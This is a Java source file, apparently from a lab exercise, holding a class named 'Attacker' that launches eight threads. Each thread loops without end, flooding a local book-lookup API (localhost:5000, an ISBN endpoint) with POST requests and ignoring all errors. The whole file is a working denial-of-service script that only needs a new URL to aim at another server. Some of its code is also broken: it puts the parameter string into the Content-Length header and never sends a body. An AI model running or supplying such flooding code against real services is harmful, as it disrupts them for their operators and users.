package FOIS_LAB;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    public static void main(String... args) throws Exception {
        for (int i = 0; i < 8; i++) {
            DdosThread thread = new DdosThread();
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = Functions.schemeAdder("localhost:5000/api/v1/isbn/1416949658");
        private final URL url;


        String param = null;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {

                }
            }
        }

        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Java Program");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode() +" "+connection.getResponseMessage());
            connection.getInputStream();
        }
    }

}
